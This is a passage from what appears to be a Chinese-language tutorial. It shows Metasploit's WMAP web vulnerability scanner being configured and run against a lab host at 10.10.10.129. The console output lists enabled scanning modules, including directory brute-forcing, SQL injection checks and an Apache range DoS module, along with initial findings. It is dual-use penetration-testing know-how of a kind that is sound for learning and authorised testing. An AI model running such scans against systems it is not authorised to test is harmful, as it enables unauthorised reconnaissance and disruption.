    <span class="nx">setg</span>          <span class="nx">Sets</span> <span class="nx">a</span> <span class="nb">global</span> <span class="nx">variable</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">value</span>
    <span class="nx">show</span>          <span class="nx">Displays</span> <span class="nx">modules</span> <span class="k">of</span> <span class="nx">a</span> <span class="nx">given</span> <span class="nx">type</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">all</span> <span class="nx">modules</span>
    <span class="nx">sleep</span>         <span class="nx">Do</span> <span class="nx">nothing</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">specified</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">seconds</span>
    <span class="nx">spool</span>         <span class="nx">Write</span> <span class="nx">console</span> <span class="nx">output</span> <span class="nx">into</span> <span class="nx">a</span> <span class="nx">file</span> <span class="k">as</span> <span class="nx">well</span> <span class="nx">the</span> <span class="nx">screen</span>
    <span class="nx">threads</span>       <span class="nx">View</span> <span class="nx">and</span> <span class="nx">manipulate</span> <span class="nx">background</span> <span class="nx">threads</span>
    <span class="nx">unload</span>        <span class="nx">Unload</span> <span class="nx">a</span> <span class="nx">framework</span> <span class="nx">plugin</span>
    <span class="nx">unset</span>         <span class="nx">Unsets</span> <span class="nx">one</span> <span class="nx">or</span> <span class="nx">more</span> <span class="nx">context</span><span class="o">-</span><span class="nx">specific</span> <span class="nx">variables</span>
    <span class="nx">unsetg</span>        <span class="nx">Unsets</span> <span class="nx">one</span> <span class="nx">or</span> <span class="nx">more</span> <span class="nb">global</span> <span class="nx">variables</span>
    <span class="nx">use</span>           <span class="nx">Selects</span> <span class="nx">a</span> <span class="nx">module</span> <span class="nx">by</span> <span class="nx">name</span>
    <span class="nx">version</span>       <span class="nx">Show</span> <span class="nx">the</span> <span class="nx">framework</span> <span class="nx">and</span> <span class="nx">console</span> <span class="nx">library</span> <span class="nx">version</span> <span class="nx">numbers</span>


<span class="nx">Database</span> <span class="nx">Backend</span> <span class="nx">Commands</span>
<span class="o">=========================</span>

    <span class="nx">Command</span>           <span class="nx">Description</span>
    <span class="o">-------</span>           <span class="o">-----------</span>
    <span class="nx">creds</span>             <span class="nx">List</span> <span class="nx">all</span> <span class="nx">credentials</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">db_connect</span>        <span class="nx">Connect</span> <span class="nx">to</span> <span class="nx">an</span> <span class="nx">existing</span> <span class="nx">database</span>
    <span class="nx">db_disconnect</span>     <span class="nx">Disconnect</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">instance</span>
    <span class="nx">db_export</span>         <span class="nx">Export</span> <span class="nx">a</span> <span class="nx">file</span> <span class="nx">containing</span> <span class="nx">the</span> <span class="nx">contents</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">db_import</span>         <span class="nx">Import</span> <span class="nx">a</span> <span class="nx">scan</span> <span class="nx">result</span> <span class="nx">file</span> <span class="p">(</span><span class="nx">filetype</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">auto</span><span class="o">-</span><span class="nx">detected</span><span class="p">)</span>
    <span class="nx">db_nmap</span>           <span class="nx">Executes</span> <span class="nx">nmap</span> <span class="nx">and</span> <span class="nx">records</span> <span class="nx">the</span> <span class="nx">output</span> <span class="nx">automatically</span>
    <span class="nx">db_rebuild_cache</span>  <span class="nx">Rebuilds</span> <span class="nx">the</span> <span class="nx">database</span><span class="o">-</span><span class="nx">stored</span> <span class="nx">module</span> <span class="nx">cache</span>
    <span class="nx">db_status</span>         <span class="nx">Show</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">status</span>
    <span class="nx">hosts</span>             <span class="nx">List</span> <span class="nx">all</span> <span class="nx">hosts</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">loot</span>              <span class="nx">List</span> <span class="nx">all</span> <span class="nx">loot</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">notes</span>             <span class="nx">List</span> <span class="nx">all</span> <span class="nx">notes</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">services</span>          <span class="nx">List</span> <span class="nx">all</span> <span class="nx">services</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">vulns</span>             <span class="nx">List</span> <span class="nx">all</span> <span class="nx">vulnerabilities</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">database</span>
    <span class="nx">workspace</span>         <span class="nx">Switch</span> <span class="nx">between</span> <span class="nx">database</span> <span class="nx">workspaces</span>
</code></pre></div></div>

<p><strong>0x05设置目标url</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_sites</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.129</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Site</span> <span class="nx">created</span><span class="p">.</span>
</code></pre></div></div>

<p><strong>0x06查看添加的站点</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_sites</span> <span class="o">-</span><span class="nx">l</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Available</span> <span class="nx">sites</span>
<span class="o">===============</span>

     <span class="nx">Id</span>  <span class="nx">Host</span>          <span class="nx">Vhost</span>         <span class="nx">Port</span>  <span class="nx">Proto</span>  <span class="err">#</span> <span class="nx">Pages</span>  <span class="err">#</span> <span class="nx">Forms</span>
     <span class="o">--</span>  <span class="o">----</span>          <span class="o">-----</span>         <span class="o">----</span>  <span class="o">-----</span>  <span class="o">-------</span>  <span class="o">-------</span>
     <span class="mi">0</span>   <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">80</span>    <span class="nx">http</span>   <span class="mi">0</span>        <span class="mi">0</span>
</code></pre></div></div>

<p><strong>0x07查看wmap_targets的使用，并添加目标</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_targets</span> <span class="o">-</span><span class="nx">h</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Usage</span><span class="p">:</span> <span class="nx">wmap_targets</span> <span class="p">[</span><span class="nx">options</span><span class="p">]</span>
	<span class="o">-</span><span class="nx">h</span> 		<span class="nx">Display</span> <span class="k">this</span> <span class="nx">help</span> <span class="nx">text</span>
	<span class="o">-</span><span class="nx">t</span> <span class="p">[</span><span class="nx">urls</span><span class="p">]</span>	<span class="nx">Define</span> <span class="nx">target</span> <span class="nx">sites</span> <span class="p">(</span><span class="nx">vhost1</span><span class="p">,</span><span class="nx">url</span><span class="p">[</span><span class="nx">space</span><span class="p">]</span><span class="nx">vhost2</span><span class="p">,</span><span class="nx">url</span><span class="p">)</span> 
	<span class="o">-</span><span class="nx">d</span> <span class="p">[</span><span class="nx">ids</span><span class="p">]</span>	<span class="nx">Define</span> <span class="nx">target</span> <span class="nx">sites</span> <span class="p">(</span><span class="nx">id1</span><span class="p">,</span> <span class="nx">id2</span><span class="p">,</span> <span class="nx">id3</span> <span class="p">...)</span>
	<span class="o">-</span><span class="nx">c</span> 		<span class="nx">Clean</span> <span class="nx">target</span> <span class="nx">sites</span> <span class="nx">list</span>
	<span class="o">-</span><span class="nx">l</span>  		<span class="nx">List</span> <span class="nx">all</span> <span class="nx">target</span> <span class="nx">sites</span>

<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_targets</span> <span class="o">-</span><span class="nx">d</span> <span class="mi">0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Loading</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">,</span><span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.129:80/.</span>
</code></pre></div></div>

<p><strong>0x08查看设定的wmap_targets</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_targets</span> <span class="o">-</span><span class="nx">l</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Defined</span> <span class="nx">targets</span>
<span class="o">===============</span>

     <span class="nx">Id</span>  <span class="nx">Vhost</span>         <span class="nx">Host</span>          <span class="nx">Port</span>  <span class="nx">SSL</span>    <span class="nx">Path</span>
     <span class="o">--</span>  <span class="o">-----</span>         <span class="o">----</span>          <span class="o">----</span>  <span class="o">---</span>    <span class="o">----</span>
     <span class="mi">0</span>   <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">80</span>    <span class="kc">false</span>  	<span class="o">/</span>
</code></pre></div></div>

<p><strong>0x09查看wmap开启的模块</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Usage</span><span class="p">:</span> <span class="nx">wmap_run</span> <span class="p">[</span><span class="nx">options</span><span class="p">]</span>
	<span class="o">-</span><span class="nx">h</span>                        <span class="nx">Display</span> <span class="k">this</span> <span class="nx">help</span> <span class="nx">text</span>
	<span class="o">-</span><span class="nx">t</span>                        <span class="nx">Show</span> <span class="nx">all</span> <span class="nx">enabled</span> <span class="nx">modules</span>
	<span class="o">-</span><span class="nx">m</span> <span class="p">[</span><span class="nx">regex</span><span class="p">]</span>                <span class="nx">Launch</span> <span class="nx">only</span> <span class="nx">modules</span> <span class="nx">that</span> <span class="nx">name</span> <span class="nx">match</span> <span class="nx">provided</span> <span class="nx">regex</span><span class="p">.</span>
	<span class="o">-</span><span class="nx">p</span> <span class="p">[</span><span class="nx">regex</span><span class="p">]</span>                <span class="nx">Only</span> <span class="nx">test</span> <span class="nx">path</span> <span class="nx">defined</span> <span class="nx">by</span> <span class="nx">regex</span><span class="p">.</span>
	<span class="o">-</span><span class="nx">e</span> <span class="p">[</span><span class="sr">/path/</span><span class="nx">to</span><span class="o">/</span><span class="nx">profile</span><span class="p">]</span>     <span class="nx">Launch</span> <span class="nx">profile</span> <span class="nx">modules</span> <span class="nx">against</span> <span class="nx">all</span> <span class="nx">matched</span> <span class="nx">targets</span><span class="p">.</span>
	                          <span class="p">(</span><span class="nx">No</span> <span class="nx">profile</span> <span class="nx">file</span> <span class="nx">runs</span> <span class="nx">all</span> <span class="nx">enabled</span> <span class="nx">modules</span><span class="p">.)</span>
<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_run</span> <span class="o">-</span><span class="nx">t</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Testing</span> <span class="nx">target</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">Site</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">Port</span><span class="p">:</span> <span class="mi">80</span> <span class="nx">SSL</span><span class="p">:</span> <span class="kc">false</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Testing</span> <span class="nx">started</span><span class="p">.</span> <span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">16</span> <span class="mi">03</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">00</span> <span class="o">-</span><span class="mi">0500</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Loading</span> <span class="nx">wmap</span> <span class="nx">modules</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">40</span> <span class="nx">wmap</span> <span class="nx">enabled</span> <span class="nx">modules</span> <span class="nx">loaded</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">SSL</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Target</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">SSL</span><span class="p">.</span> <span class="nx">SSL</span> <span class="nx">modules</span> <span class="nx">disabled</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">Web</span> <span class="nx">Server</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">http_version</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">open_proxy</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">tomcat_administration</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">tomcat_utf8_traversal</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">drupal_views_user_enum</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">frontpage_login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">host_header_injection</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">options</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">robots_txt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">scraper</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">svn_scanner</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">trace</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">vhost_scanner</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">webdav_internal_ip</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">webdav_scanner</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">webdav_website_content</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">File</span><span class="o">/</span><span class="nx">Dir</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">dos</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">apache_range_dos</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">backup_file</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">brute_dirs</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">copy_of_file</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">dir_listing</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">dir_scanner</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">dir_webdav_unicode_bypass</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">file_same_name_dir</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">files_dir</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">http_put</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">ms09_020_webdav_unicode_bypass</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">prev_dir_same_name_file</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">replace_ext</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">soap_xml</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">trace_axd</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">verb_auth_bypass</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">Unique</span> <span class="nx">Query</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">blind_sql_query</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">error_sql_injection</span>
</code></pre></div></div>

<p><strong>0x10运行wmap攻击</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_run</span> <span class="o">-</span><span class="nx">e</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">ALL</span> <span class="nx">wmap</span> <span class="nx">enabled</span> <span class="nx">modules</span><span class="p">.</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">NO</span> <span class="nx">WMAP</span> <span class="nx">NODES</span> <span class="nx">DEFINED</span><span class="p">.</span> <span class="nx">Executing</span> <span class="nx">local</span> <span class="nx">modules</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Testing</span> <span class="nx">target</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">Site</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">Port</span><span class="p">:</span> <span class="mi">80</span> <span class="nx">SSL</span><span class="p">:</span> <span class="kc">false</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Testing</span> <span class="nx">started</span><span class="p">.</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">16</span> <span class="mi">03</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">39</span> <span class="o">-</span><span class="mi">0500</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">SSL</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Target</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">SSL</span><span class="p">.</span> <span class="nx">SSL</span> <span class="nx">modules</span> <span class="nx">disabled</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 
<span class="o">=</span><span class="p">[</span> <span class="nx">Web</span> <span class="nx">Server</span> <span class="nx">testing</span> <span class="p">]</span><span class="o">=</span>
<span class="o">============================================================</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">http_version</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">80</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.2</span><span class="p">.</span><span class="mi">14</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span> <span class="nx">mod_mono</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">3</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.3</span><span class="p">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="p">.</span><span class="mi">5</span> <span class="kd">with</span> <span class="nx">Suhosin</span><span class="o">-</span><span class="nx">Patch</span> <span class="nx">mod_python</span><span class="o">/</span><span class="mf">3.3</span><span class="p">.</span><span class="mi">1</span> <span class="nx">Python</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">5</span> <span class="nx">mod_perl</span><span class="o">/</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">4</span> <span class="nx">Perl</span><span class="o">/</span><span class="nx">v5</span><span class="p">.</span><span class="mf">10.1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">open_proxy</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">tomcat_administration</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">tomcat_utf8_traversal</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Attempting</span> <span class="nx">to</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">80</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">File</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">found</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">drupal_views_user_enum</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span> <span class="nx">does</span> <span class="nx">not</span> <span class="nx">appear</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">vulnerable</span><span class="p">,</span> <span class="nx">will</span> <span class="nx">not</span> <span class="k">continue</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">frontpage_login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.129/ may not support FrontPage Server Extensions</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">host_header_injection</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">options</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span> <span class="nx">allows</span> <span class="nx">GET</span><span class="p">,</span><span class="nx">HEAD</span><span class="p">,</span><span class="nx">POST</span><span class="p">,</span><span class="nx">OPTIONS</span><span class="p">,</span><span class="nx">TRACE</span> <span class="nx">methods</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="nx">TRACE</span> <span class="nx">method</span> <span class="nx">allowed</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">robots_txt</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">]</span> <span class="o">/</span><span class="nx">robots</span><span class="p">.</span><span class="nx">txt</span> <span class="nx">found</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Module</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">http</span><span class="o">/</span><span class="nx">scraper</span>
<span class="p">...</span>
</code></pre></div></div>

<p><strong>0x11查看扫描结果</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">wmap_vulns</span> <span class="o">-</span><span class="nx">l</span>
